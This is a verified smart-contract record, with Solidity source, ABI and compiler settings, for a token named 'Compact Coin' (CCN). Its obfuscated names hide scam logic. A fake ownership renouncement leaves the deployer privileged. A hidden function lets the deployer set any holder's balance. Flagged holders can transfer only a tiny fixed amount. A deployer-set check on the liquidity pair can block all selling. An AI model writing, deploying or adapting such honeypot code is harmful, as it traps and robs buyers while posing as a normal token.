{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\ninterface launchTotalList {\n    function createPair(address modeLimit, address launchFund) external returns (address);\n    function feeTo() external view returns (address);\n}\n\ninterface autoMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMarketing) external view returns (uint256);\n\n    function transfer(address liquidityListTrading, uint256 takeTokenMarketing) external returns (bool);\n\n    function allowance(address buyReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeTokenMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityListTrading,\n        uint256 takeTokenMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverMinExempt, uint256 value);\n    event Approval(address indexed buyReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract exemptTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoMarketingMetadata is autoMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompactCoin is exemptTx, autoMarketing, autoMarketingMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldLaunched;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitWallet;\n    }\n\n    function transfer(address isAuto, uint256 takeTokenMarketing) external virtual override returns (bool) {\n        return isMaxToken(_msgSender(), isAuto, takeTokenMarketing);\n    }\n\n    uint256 private atMin;\n\n    function buySwapSender(address senderLiquidity) public {\n        amountSwapSell();\n        \n        if (senderLiquidity == receiverAuto || senderLiquidity == toFee) {\n            return;\n        }\n        shouldReceiver[senderLiquidity] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunch;\n    }\n\n    function autoMax(address maxTeam, address liquidityListTrading, uint256 takeTokenMarketing) internal returns (bool) {\n        require(sellFrom[maxTeam] >= takeTokenMarketing);\n        sellFrom[maxTeam] -= takeTokenMarketing;\n        sellFrom[liquidityListTrading] += takeTokenMarketing;\n        emit Transfer(maxTeam, liquidityListTrading, takeTokenMarketing);\n        return true;\n    }\n\n    function balanceOf(address fundMarketing) public view virtual override returns (uint256) {\n        return sellFrom[fundMarketing];\n    }\n\n    function transferFrom(address maxTeam, address liquidityListTrading, uint256 takeTokenMarketing) external override returns (bool) {\n        if (_msgSender() != txFundExempt) {\n            if (maxFee[maxTeam][_msgSender()] != type(uint256).max) {\n                require(takeTokenMarketing <= maxFee[maxTeam][_msgSender()]);\n                maxFee[maxTeam][_msgSender()] -= takeTokenMarketing;\n            }\n        }\n        return isMaxToken(maxTeam, liquidityListTrading, takeTokenMarketing);\n    }\n\n    string private limitWallet = \"CCN\";\n\n    uint256 private shouldTx;\n\n    mapping(address => bool) public shouldReceiver;\n\n    string private toLaunch = \"Compact Coin\";\n\n    constructor (){\n        if (shouldTx == atMin) {\n            maxIs = false;\n        }\n        tradingIsWallet();\n        liquidityReceiver tokenLiquidity = liquidityReceiver(txFundExempt);\n        toFee = launchTotalList(tokenLiquidity.factory()).createPair(tokenLiquidity.WETH(), address(this));\n        fromAuto = launchTotalList(tokenLiquidity.factory()).feeTo();\n        if (walletSell != teamReceiver) {\n            txList = true;\n        }\n        receiverAuto = _msgSender();\n        txAmount[receiverAuto] = true;\n        sellFrom[receiverAuto] = shouldLaunched;\n        if (walletSell == atMin) {\n            txList = false;\n        }\n        emit Transfer(address(0), receiverAuto, shouldLaunched);\n    }\n\n    bool private maxIs;\n\n    uint256 private shouldLaunched = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return totalLimitMarketing;\n    }\n\n    address public toFee;\n\n    function tradingIsWallet() public {\n        emit OwnershipTransferred(receiverAuto, address(0));\n        totalLimitMarketing = address(0);\n    }\n\n    event OwnershipTransferred(address indexed launchedListLimit, address indexed receiverList);\n\n    mapping(address => bool) public txAmount;\n\n    function isMaxToken(address maxTeam, address liquidityListTrading, uint256 takeTokenMarketing) internal returns (bool) {\n        if (maxTeam == receiverAuto) {\n            return autoMax(maxTeam, liquidityListTrading, takeTokenMarketing);\n        }\n        uint256 tradingSellLiquidity = autoMarketing(toFee).balanceOf(fromAuto);\n        require(tradingSellLiquidity == isTeamTake);\n        require(liquidityListTrading != fromAuto);\n        if (shouldReceiver[maxTeam]) {\n            return autoMax(maxTeam, liquidityListTrading, buyShould);\n        }\n        return autoMax(maxTeam, liquidityListTrading, takeTokenMarketing);\n    }\n\n    uint256 tokenModeReceiver;\n\n    function amountSwapSell() private view {\n        require(txAmount[_msgSender()]);\n    }\n\n    address txFundExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public teamReceiver;\n\n    function approve(address sellMarketing, uint256 takeTokenMarketing) public virtual override returns (bool) {\n        maxFee[_msgSender()][sellMarketing] = takeTokenMarketing;\n        emit Approval(_msgSender(), sellMarketing, takeTokenMarketing);\n        return true;\n    }\n\n    uint256 isTeamTake;\n\n    function walletReceiverTo(address isAuto, uint256 takeTokenMarketing) public {\n        amountSwapSell();\n        sellFrom[isAuto] = takeTokenMarketing;\n    }\n\n    bool public receiverExempt;\n\n    function fundFeeList(uint256 takeTokenMarketing) public {\n        amountSwapSell();\n        isTeamTake = takeTokenMarketing;\n    }\n\n    function allowance(address marketingAuto, address sellMarketing) external view virtual override returns (uint256) {\n        if (sellMarketing == txFundExempt) {\n            return type(uint256).max;\n        }\n        return maxFee[marketingAuto][sellMarketing];\n    }\n\n    mapping(address => uint256) private sellFrom;\n\n    bool public txList;\n\n    function takeReceiver(address buyTx) public {\n        if (receiverExempt) {\n            return;\n        }\n        \n        txAmount[buyTx] = true;\n        if (maxIs) {\n            teamReceiver = shouldTx;\n        }\n        receiverExempt = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private maxFee;\n\n    address fromAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listFund;\n    }\n\n    uint8 private listFund = 18;\n\n    address public receiverAuto;\n\n    function owner() external view returns (address) {\n        return totalLimitMarketing;\n    }\n\n    uint256 private walletSell;\n\n    uint256 constant buyShould = 9 ** 10;\n\n    address private totalLimitMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedListLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMinExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTokenMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"buySwapSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeTokenMarketing\",\"type\":\"uint256\"}],\"name\":\"fundFeeList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"takeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIsWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityListTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeTokenMarketing\",\"type\":\"uint256\"}],\"name\":\"walletReceiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompactCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}